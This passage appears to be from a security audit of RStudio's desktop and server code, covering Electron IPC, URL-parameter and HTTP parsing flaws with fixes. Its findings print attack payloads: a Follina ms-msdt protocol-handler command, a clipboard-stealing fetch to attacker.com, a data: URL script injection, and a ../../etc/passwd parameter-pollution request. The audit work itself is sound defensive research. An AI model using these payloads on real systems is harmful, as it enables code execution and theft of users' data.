| `parseQueryString()` on content URL | `file`, `title` | C++ HTTP | `SessionContentUrls.cpp:88` |
| `pathAfterPrefix()` | URI path suffix | C++ HTTP | 13+ handlers |
| `Window.Location.getParameter("restore_workspace")` | `restore_workspace` | GWT/Java | `Application.java:382` |
| `Window.Location.getParameter("run_rprofile")` | `run_rprofile` | GWT/Java | `Application.java:388` |
| `Window.Location.getParameter("edit_published")` | `edit_published` | GWT/Java | `Source.java:785` |
| `Window.Location.getParameter("view")` | `view` | GWT/Java | `Application.java` (satellite) |
| `ipcMain.on('desktop_browse_url')` | `url` | Electron IPC | `gwt-callback.ts:178` |
| `ipcMain.on('desktop_set_viewer_url')` | `url` | Electron IPC | `gwt-callback.ts:936` |
| `ipcMain.on('desktop_set_tutorial_url')` | `url` | Electron IPC | `gwt-callback.ts:932` |
| `ipcMain.on('desktop_set_presentation_url')` | `url` | Electron IPC | `gwt-callback.ts:940` |
| `ipcMain.on('desktop_set_shiny_dialog_url')` | `url` | Electron IPC | `gwt-callback.ts:951` |
| `ipcMain.on('desktop_reload_viewer_zoom_window')` | `url` | Electron IPC | `gwt-callback.ts:944` |
| `ipcMain.handle('desktop_get_clipboard_text')` | (none — reads clipboard) | Electron IPC | `gwt-callback.ts:353` |
| `ipcMain.handle('desktop_get_clipboard_uris')` | (none — reads clipboard) | Electron IPC | `gwt-callback.ts:358` |
| `ipcMain.handle('desktop_get_clipboard_image')` | (none — reads clipboard) | Electron IPC | `gwt-callback.ts:383` |

### Phase 2 — Dataflow Table

| Source | Transforms | Sink | Vuln Class |
|---|---|---|---|
| `desktop_browse_url(url)` | None | `shell.openExternal(url)` | Arbitrary protocol handler |
| `desktop_reload_viewer_zoom_window(url)` | None | `browser.window.webContents.loadURL(url)` | Trusted-window URL injection |
| `desktop_set_viewer_url(url)` | None | `this.viewerUrl = url` → used in `allowNavigation()` whitelist | Navigation whitelist poisoning |
| `desktop_set_tutorial_url(url)` | None | `this.tutorialUrl = url` → used in `allowNavigation()` whitelist | Navigation whitelist poisoning |
| `desktop_set_presentation_url(url)` | None | `this.presentationUrl = url` → used in `allowNavigation()` whitelist | Navigation whitelist poisoning |
| `desktop_set_shiny_dialog_url(url)` | None | `this.shinyDialogUrl = url` → used in `allowNavigation()` whitelist | Navigation whitelist poisoning |
| `desktop_get_clipboard_text()` | None | `clipboard.readText()` → returned to renderer | Data exfiltration |
| `desktop_get_clipboard_uris()` | `split('\n')`, strip `file://` prefix | `clipboard.read('text/uri-list')` → returned to renderer | Data exfiltration |
| `Window.Location.getParameter("restore_workspace")` | `Integer.parseInt()` | `options.setRestoreWorkspace(int)` → session init | AuthN/AuthZ bypass |
| `Window.Location.getParameter("run_rprofile")` | `Integer.parseInt()` | `options.setRunRprofile(int)` → session init | AuthN/AuthZ bypass |
| `queryParamValue(name)` (any duplicate) | `fieldValue()` returns first match | Various handlers | Parameter pollution |

### Verified Safe Entry Points (No Finding)

| Entry Point | Why Safe |
|---|---|
| `appUri` → login template (`#appUri#`) | Template uses `#appUri#` syntax → `htmlEscape(value, true)` escapes `<>&'"\/\r\n`. Attribute injection blocked. |
| `appUri` → `setMovedTemporarily()` redirect | `URL::complete(baseUri, path)` normalizes `//evil.com` → `/evil.com`. Open redirect blocked. |
| `base_uri` / `request_uri` → `#!base_uri#` in JS | `jsLiteralEscape()` escapes `<` → `\074`, preventing `</script>` injection. |
| SQL queries in `DBActiveSessionsStorage.cpp` | All queries use parameterized `:id`, `:name` bind variables. |
| R `addParam()` from query values | Creates typed R SEXP objects, not string-evaluated. |
| `executeCode` RPC | Intentional functionality — IDE must execute R code. |

---

### Phase 3 — Findings

---

### VULN-23 — Arbitrary OS Protocol Handler Execution via `desktop_browse_url` IPC (HIGH)

**Source:** `src/node/desktop/src/main/gwt-callback.ts:178`
**Sink:** `src/node/desktop/src/main/gwt-callback.ts:185` — `shell.openExternal(url)`
**Type:** Arbitrary Protocol Handler Execution
**Platform:** Desktop (Electron) only
**Confidence:** HIGH

#### Code Path

```typescript
// gwt-callback.ts:178-187
ipcMain.on('desktop_browse_url', (event, url: string) => {
  // shell.openExternal() seems unreliable on Windows
  // https://github.com/electron/electron/issues/31347
  if (process.platform === 'win32' && url.startsWith('file:///')) {
    const path = decodeURI(url).substring('file:///'.length).replaceAll('/', '\\');
    desktop.openExternal(path);   // Windows: passes to ShellExecute
  } else {
    void shell.openExternal(url); // All platforms: opens OS default handler
  }
});
```

**Key Observation:** The `isAllowedProtocol()` function in `url-utils.ts:67-71` restricts navigation to `['http:', 'https:', 'mailto:', 'data:']`, but `desktop_browse_url` does NOT call `isAllowedProtocol()`. It passes the URL directly to `shell.openExternal()` with zero validation.

```typescript
// url-utils.ts:67-71 — exists but NOT applied to desktop_browse_url
export function isAllowedProtocol(url: URL) {
  const protocol = url.protocol;
  const allowedProtocols = ['http:', 'https:', 'mailto:', 'data:'];
  return allowedProtocols.includes(protocol);
}
```

#### Dataflow

```
Renderer (GWT app) → ipcRenderer.send('desktop_browse_url', url)
  → ipcMain.on('desktop_browse_url', ...)
    → shell.openExternal(url)           // NO protocol check
      → OS default handler for scheme
```

#### Attack Surface

On Windows, `shell.openExternal()` delegates to `ShellExecuteW`, which can trigger:
- `ms-msdt:/id PCWDiagnostic /morph ...` — Microsoft Diagnostic Tool (CVE-2022-30190 "Follina")
- `search-ms:query=...&crumb=location:\\attacker\share` — load remote SMB share listing in Explorer
- `ms-officecmd:...` — launch Office applications with parameters
- `vbscript:Execute("CreateObject(""Wscript.Shell"").Run ""calc""")` — direct code execution (older Windows)

On macOS, triggers Launch Services for any registered URL scheme.
On Linux, delegates to `xdg-open` which follows system MIME handlers.

#### Exploitation

Requires JavaScript execution in the main GWT renderer context. An attacker who chains this with XSS (e.g., VULN-20/21/22) or with a malicious R package that produces content displayed in the IDE can call:

```javascript
window.desktopBridge.browseUrl('ms-msdt:/id PCWDiagnostic /skip force /param "IT_BrowseForFile=c:\\windows\\system32\\calc.exe"');
```

#### Impact

Arbitrary code execution on the user's workstation via OS protocol handler abuse.

#### Recommendation

Apply `isAllowedProtocol()` to the URL before passing to `shell.openExternal()`. Reject any protocol not in the allowlist. For the Windows `file:///` special case, validate the path resolves to an expected location.

---

### VULN-24 — Arbitrary URL Loading in Trusted Electron Windows via IPC (HIGH)

**Source:** `src/node/desktop/src/main/gwt-callback.ts:944`
**Sink:** `src/node/desktop/src/main/gwt-callback.ts:947` — `browser.window.webContents.loadURL(url)`
**Type:** Trusted-Window Content Injection
**Platform:** Desktop (Electron) only
**Confidence:** HIGH

#### Code Path

```typescript
// gwt-callback.ts:944-948
ipcMain.on('desktop_reload_viewer_zoom_window', (_event, url) => {
  const browser = appState().windowTracker.getWindow('_rstudio_viewer_zoom');
  if (browser) {
    void browser.window.webContents.loadURL(url);  // NO validation
  }
});
```

The `url` parameter is passed directly to `loadURL()` with no protocol, domain, or content validation. This loads arbitrary content into a trusted Electron `BrowserWindow` that has the same privileges as other RStudio windows.

#### Additional Unvalidated URL Setters

These IPC handlers accept arbitrary URLs and store them as trusted navigation targets:

```typescript
// gwt-callback.ts:932-953
ipcMain.on('desktop_set_tutorial_url', (event, url) => {
  this.getSender(...).setTutorialUrl(url);     // Line 933
});
ipcMain.on('desktop_set_viewer_url', (event, url) => {
  this.getSender(...).setViewerUrl(url);       // Line 937
});
ipcMain.on('desktop_set_presentation_url', (event, url) => {
  this.getSender(...).setPresentationUrl(url); // Line 941
});
ipcMain.on('desktop_set_shiny_dialog_url', (event, url) => {
  this.getSender(...).setShinyDialogUrl(url);  // Line 952
});
```

#### Chained Impact: Navigation Whitelist Poisoning

These URL setters are consumed by `allowNavigation()` in `desktop-browser-window.ts:385-388`:

```typescript
// desktop-browser-window.ts:385-388
const viewer = this.viewerUrl ?? this.mainWindow?.viewerUrl;
const tutorial = this.tutorialUrl ?? this.mainWindow?.tutorialUrl;
const presentation = this.presentationUrl ?? this.mainWindow?.presentationUrl;
const shinyDialog = this.shinyDialogUrl ?? this.mainWindow?.shinyDialogUrl;
```

If an attacker sets `viewerUrl` to `https://attacker.com/` via IPC, then `allowNavigation()` will subsequently permit navigation to `attacker.com` in the viewer pane, because it matches the "trusted" viewer URL. This effectively poisons the navigation whitelist.

#### Payload Examples

**Load attacker-controlled HTML into viewer zoom window:**
```javascript
window.desktopBridge.reloadViewerZoomWindow('data:text/html,<script>alert(document.domain)</script>');
```

**Poison navigation whitelist to allow attacker domain:**
```javascript
window.desktopBridge.setViewerUrl('https://attacker.com/');
// Future navigations to attacker.com will now be allowed by allowNavigation()
```

#### Impact

- Load phishing content in trusted IDE windows
- Execute JavaScript in trusted window context
- Poison navigation whitelist to allow persistent access to attacker-controlled domains

#### Recommendation

Validate all URLs passed to IPC URL setters against `isAllowedProtocol()` and `isLocalUrl()`. For `desktop_reload_viewer_zoom_window`, require that the URL matches the current viewer URL's origin. Block `data:` and `javascript:` schemes in `loadURL()` calls.

---

### VULN-25 — Clipboard Data Exfiltration via IPC Without User Consent (MEDIUM)

**Source:** `src/node/desktop/src/main/gwt-callback.ts:353-398`
**Sink:** Return value to renderer process
**Type:** Information Disclosure
**Platform:** Desktop (Electron) only
**Confidence:** MEDIUM

#### Code Path

```typescript
// gwt-callback.ts:353-356
ipcMain.handle('desktop_get_clipboard_text', () => {
  const text = clipboard.readText('clipboard');
  return text;
});

// gwt-callback.ts:358-378
ipcMain.handle('desktop_get_clipboard_uris', () => {
  if (!clipboard.has('text/uri-list')) {
    return [];
  }
  const data = clipboard.read('text/uri-list');
  const parts = data.split('\n');
  const filePrefix = process.platform === 'win32' ? 'file:///' : 'file://';
  const trimmed = parts.map((x) => {
    if (x.startsWith(filePrefix)) {
      x = x.substring(filePrefix.length);
    }
    return x;
  });
  return trimmed;
});

// gwt-callback.ts:383-398
ipcMain.handle('desktop_get_clipboard_image', () => {
  // writes clipboard image to temp file and returns path
  ...
});
```

#### Analysis

These handlers read the system clipboard (text, URIs, images) and return the contents directly to the renderer. There is:
- No user consent prompt
- No origin validation on the caller
- No rate limiting
- No logging

If an attacker achieves JavaScript execution in the renderer context (via XSS), they can silently exfiltrate clipboard contents, which may include passwords, tokens, confidential text, or file paths.

#### Exploitation

```javascript
// From XSS in GWT application context
const clipboardText = await window.desktopBridge.getClipboardText();
const clipboardUris = await window.desktopBridge.getClipboardUris();
// Exfiltrate via fetch to attacker server
fetch('https://attacker.com/collect', {
  method: 'POST',
  body: JSON.stringify({ text: clipboardText, uris: clipboardUris })
});
```

#### Impact

Exfiltration of sensitive clipboard data (passwords, tokens, file paths, confidential text) without user awareness or consent.

#### Recommendation

Consider adding a visual indicator when clipboard is read programmatically, or rate-limit clipboard reads. For clipboard URI reads, validate that the consumer is a legitimate IDE operation (e.g., paste handler) rather than an arbitrary JS call.

---

### VULN-26 — R Session Initialization Override via URL Query Parameters (MEDIUM)

**Source:** `src/gwt/src/org/rstudio/studio/client/application/Application.java:382-392`
**Sink:** `SessionInitOptions.setRestoreWorkspace()` / `SessionInitOptions.setRunRprofile()`
**Type:** AuthN/AuthZ Bypass — Session Security Control Override
**Platform:** All (Server and Desktop)
**Confidence:** HIGH

#### Code Path

```java
// Application.java:376-400
// read options from querystring
SessionInitOptions options = SessionInitOptions.create(
      SessionInitOptions.RESTORE_WORKSPACE_DEFAULT,
      SessionInitOptions.RUN_RPROFILE_DEFAULT);
try
{
   String restore = Window.Location.getParameter(
      SessionInitOptions.RESTORE_WORKSPACE_OPTION);  // "restore_workspace"
   if (!StringUtil.isNullOrEmpty(restore))
   {
      options.setRestoreWorkspace(Integer.parseInt(restore));
   }

   String run = Window.Location.getParameter(
      SessionInitOptions.RUN_RPROFILE_OPTION);        // "run_rprofile"
   if (!StringUtil.isNullOrEmpty(run))
   {
      options.setRunRprofile(Integer.parseInt(run));
   }
}
catch(Exception e)
{
   Debug.logException(e);
}

// attempt init
clientInit.execute(callback, options, true);
```

#### Server-Side Consumption

```cpp
// SessionClientInit.cpp:251-262
// apply session init options
int restoreWorkspace = state.initOptions().restoreWorkspace();
int runRprofile = state.initOptions().runRprofile();
```

These values directly control whether:
1. The R workspace (`.RData`) is restored on session start
2. The `.Rprofile` startup script is executed

#### Security Implications

**Bypass `.Rprofile` security controls:**
An organization may use `.Rprofile` to enforce security policies (disable certain packages, set proxy settings, configure audit logging). An attacker with link-sharing ability can craft:
```
https://rstudio-server/s/session123/?run_rprofile=0
```
This skips `.Rprofile` execution entirely, bypassing any security controls it implements.

**Force `.Rprofile` execution when disabled:**
Conversely, if an admin has disabled `.Rprofile` for security reasons (e.g., to prevent supply-chain attacks via `.Rprofile`), an attacker can force it:
```
https://rstudio-server/s/session123/?run_rprofile=1
```

**Skip workspace restore to avoid detection:**
```
https://rstudio-server/s/session123/?restore_workspace=0
```

#### Values

| Value | `restore_workspace` Behavior | `run_rprofile` Behavior |
|---|---|---|
| 0 | Skip restore | Skip `.Rprofile` |
| 1 | Force restore | Force `.Rprofile` |
| 2 | Use default setting | Use default setting |

#### Impact

Override session initialization behavior through URL manipulation. Can bypass security policies enforced via `.Rprofile` or force unintended startup behavior.

#### Recommendation

Remove query parameter control over session initialization options, or restrict it to authenticated admin users only. If needed for legitimate use cases, validate against server-side policy settings and log overrides.

---

### VULN-27 — HTTP Parameter Pollution: First-Wins Behavior (LOW)

**Source:** `src/cpp/core/http/Util.cpp:54-59`
**Type:** HTTP Parameter Pollution
**Platform:** All
**Confidence:** MEDIUM

#### Code Path

```cpp
// Util.cpp:54-59
std::string fieldValue(const Fields& fields, const std::string& name)
{
   Fields::const_iterator pos = findField(fields, name);
   if (pos != fields.end())
      return pos->second;
   else
      return std::string();
}
```

`findField()` performs a linear scan and returns the first match. When duplicate query parameters exist (e.g., `?file=safe.txt&file=../../etc/passwd`), only the first value is used.

```cpp
// Request.cpp:362-366
std::string Request::queryParamValue(const std::string& name) const
{
   ensureQueryParamsParsed();
   return util::fieldValue(queryParams(), name);
}
```

#### Analysis

While first-wins behavior is consistent, it creates risk when:
1. A reverse proxy or WAF inspects a different occurrence (last-wins) for malicious content
2. The backend processes the first occurrence, which the WAF did not inspect
3. Frontend (GWT) and backend (C++) may parse duplicate parameters differently

Example attack if a WAF checks last value:
```
GET /content?file=../../etc/passwd&file=safe.txt
```
- WAF sees `file=safe.txt` (last) → allows
- Backend uses `file=../../etc/passwd` (first) → path traversal

#### Impact

Potential WAF bypass when combined with other vulnerabilities. Low standalone severity.

#### Recommendation

Document the first-wins behavior. Consider rejecting requests with duplicate security-sensitive parameters. Ensure any WAF/proxy configuration uses first-wins parsing to match backend behavior.

---

### VULN-28 — Electron IPC Handler Missing Origin Validation (MEDIUM)

**Source:** All `ipcMain.on()` / `ipcMain.handle()` handlers in `gwt-callback.ts`
**Type:** Missing Origin Validation on IPC Channel
**Platform:** Desktop (Electron) only
**Confidence:** HIGH

#### Code Path

```typescript
// Example: gwt-callback.ts:178
ipcMain.on('desktop_browse_url', (event, url: string) => {
  // event.processId and event.frameId are available but NOT checked
  void shell.openExternal(url);
});
```

No IPC handler validates:
- `event.senderFrame.url` — which page sent the IPC message
- `event.senderFrame.origin` — the origin of the sending frame
- Whether the sender is the main GWT application vs. content loaded in an iframe (viewer, tutorial, help)

The `getSender()` helper at line 133 validates that the sender process/frame match a known `GwtWindow`, but this is a session-level check that doesn't distinguish between the main application frame and potentially attacker-controlled sub-frames:

```typescript
// gwt-callback.ts:133-140
getSender(channel: string, processId: number, frameId: number): GwtWindow {
  for (const owner of this.owners) {
    if (owner.window.webContents.processId === processId) {
      return owner;
    }
  }
  // Falls through to mainWindow
  return this.mainWindow;
}
```

The `processId` check matches at the process level — all frames within a `BrowserWindow` share the same `processId`. A compromised iframe (e.g., via R httpd XSS) within a GwtWindow has the same `processId` and would pass this check.

#### Impact

Content loaded in viewer/tutorial/help iframes within the main RStudio window shares the same `processId`, meaning IPC messages from those iframes would be accepted as if they came from the main GWT application. This amplifies the impact of any HTML/JS injection in R httpd output (VULN-19) to include all IPC capabilities (VULN-23, 24, 25).

#### Recommendation

Add `event.senderFrame.url` origin validation to security-sensitive IPC handlers. Verify the sender URL matches the expected GWT application URL before processing privileged operations like `shell.openExternal()`, `loadURL()`, or clipboard access.

---

### Phase 4 — Hardening Checklist

#### P0 — Critical (Desktop Electron IPC)

| Fix | Vuln |
|---|---|
| Apply `isAllowedProtocol()` check to `desktop_browse_url` handler before calling `shell.openExternal()`. Block `file:`, `ms-msdt:`, `search-ms:`, `vbscript:`, and all non-`http(s):/mailto:` schemes. | VULN-23 |
| Validate URL in `desktop_reload_viewer_zoom_window` against `isAllowedProtocol()` and `isLocalUrl()`. Block `data:` and `javascript:` schemes. | VULN-24 |
| Add URL validation to all `desktop_set_*_url` IPC handlers. Verify URLs match `isAllowedProtocol()` before storing as trusted navigation targets. | VULN-24 |
| Add `event.senderFrame.url` origin validation to all security-sensitive IPC handlers. Reject messages from frames whose URL doesn't match the GWT application origin. | VULN-28 |

#### P1 — High

| Fix | Vuln |
|---|---|
| Remove `restore_workspace` and `run_rprofile` query parameter overrides from `Application.java`, or gate them behind server-side admin policy validation. | VULN-26 |

#### P2 — Medium

| Fix | Vuln |
|---|---|
| Add visual indicator or rate limiting for programmatic clipboard reads via IPC. | VULN-25 |
| Document first-wins parameter parsing behavior and ensure WAF/proxy configurations use consistent parsing. | VULN-27 |

#### Architectural Recommendations (Fourth Pass)

6. **Electron IPC allowlist pattern:** Create a centralized IPC message validator that checks `event.senderFrame.url` origin and validates URL parameters against `isAllowedProtocol()` + `isLocalUrl()` before dispatching to handlers. Apply this to all IPC handlers in `gwt-callback.ts`.

7. **URL validation utility:** Create a shared `validateIpcUrl(url: string, allowedProtocols?: string[])` function that validates protocol, domain, and content before any URL is loaded, opened externally, or stored as a navigation target.

8. **Session init options policy:** Move session initialization option control to the server-side configuration only. If query parameter overrides are needed, validate them against server policy and require authenticated admin context.

---

### Edge-Case Coverage Notes

| Edge Case | Investigated | Result |
|---|---|---|
| **Parameter pollution (duplicate params)** | Yes — `Util.cpp:54-59` | First-wins behavior via `fieldValue()`. See VULN-27. |
| **Multi-encoding (`%2e%2e`)** | Yes — `Util.cpp:389-406` | `pathAfterPrefix()` decodes AFTER cleanup. Already covered in VULN-09/15/16 (path traversal, excluded from this pass). |
| **Type confusion** | Yes — `Application.java:385` | `Integer.parseInt()` on query param; `NumberFormatException` caught by generic handler. Safe — no type confusion exploit. |
| **URL parsing quirks (`//evil.com`)** | Yes — `Response.cpp:611-620` | `URL::complete(baseUri, path)` normalizes protocol-relative URLs. `//evil.com` → `/evil.com`. Open redirect blocked. |
| **Template injection (raw `#!var#`)** | Yes — multiple `.htm` files | `#!base_uri#` and `#!request_uri#` use `jsLiteralEscape()` which escapes `<` → `\074`. Safe against `</script>` injection. |
| **SQL injection** | Yes — `DBActiveSessionsStorage.cpp` | All queries use parameterized `:id`/`:name` bind variables. Safe. |
| **R code injection via query params** | Yes — `SessionHelp.cpp:701` | `parseQuery()` creates R list from query params via `addParam()` which creates typed SEXP. Not string-evaluated. Safe. |
| **SSRF via chat manifest** | Yes — `SessionChat.cpp:3656-3694` | `downloadPackage()` enforces HTTPS but no domain validation. URLs come from hardcoded manifest URL (`www.rstudio.org`), not query params. Low risk — requires manifest compromise. |
| **CSRF on GET endpoints** | Yes — all URI handlers | GET handlers serve content, not mutations. JSON-RPC (mutations) requires POST + CSRF token. Safe. |
| **Cache poisoning** | Yes — `setCacheableFile()` calls | Cache headers set based on file modification time, not query params. No query-param-controlled cache keys. Safe. |

---

### Appendix: Files Analyzed

| File | Lines Analyzed | Relevant Findings |
|---|---|---|
| `src/node/desktop/src/main/gwt-callback.ts` | 178-187, 345-398, 925-980 | VULN-23, 24, 25, 28 |
| `src/node/desktop/src/main/desktop-browser-window.ts` | 242-400 | VULN-24, 28 |
| `src/node/desktop/src/main/url-utils.ts` | 42-80 | VULN-23 (isAllowedProtocol not applied) |
| `src/node/desktop/src/renderer/desktop-bridge.ts` | 590-645 | VULN-23, 24, 25 (IPC bridge exposure) |
| `src/gwt/src/org/rstudio/studio/client/application/Application.java` | 375-400 | VULN-26 |
| `src/gwt/src/org/rstudio/studio/client/application/model/SessionInitOptions.java` | 1-58 | VULN-26 |
| `src/cpp/session/SessionClientInit.cpp` | 251-262 | VULN-26 |
| `src/cpp/core/http/Util.cpp` | 54-59, 132-175 | VULN-27 |
| `src/cpp/core/http/Request.cpp` | 260-366 | VULN-27 |
| `src/cpp/core/http/Response.cpp` | 585-620 | Verified safe (open redirect blocked) |
| `src/cpp/core/StringUtils.cpp` | 478-491 | Verified safe (jsLiteralEscape) |
| `src/cpp/core/text/TemplateFilter.hpp` | 44-78 | Verified safe (template escaping) |
| `src/cpp/server/ServerLoginPages.cpp` | 50-156 | Verified safe (appUri HTML-escaped) |
| `src/cpp/server/auth/ServerAuthCommon.cpp` | 80-270 | Verified safe (URL::complete normalization) |
| `src/cpp/server/ServerOffline.cpp` | 48-55 | Verified safe (jsLiteralEscape) |
| `src/cpp/server/ServerMain.cpp` | 216-223 | Verified safe (jsLiteralEscape) |
| `src/cpp/server/DBActiveSessionsStorage.cpp` | 50-52 | Verified safe (parameterized SQL) |
| `src/cpp/session/modules/SessionHelp.cpp` | 614-734 | Verified safe (addParam creates SEXP) |
| `src/cpp/session/modules/SessionChat.cpp` | 3325-3694 | Low risk (SSRF requires manifest compromise) |
| `src/gwt/www/templates/encrypted-sign-in.htm` | 1-180 | Verified safe (#appUri# HTML-escaped) |
| `src/gwt/www/offline.htm` | 1-112 | Verified safe (jsLiteralEscape) |
| `src/gwt/www/error.htm` | 1-108 | Verified safe (jsLiteralEscape for JS, #var# for HTML) |
| `src/gwt/www/404.htm` | 1-56 | Verified safe (jsLiteralEscape) |
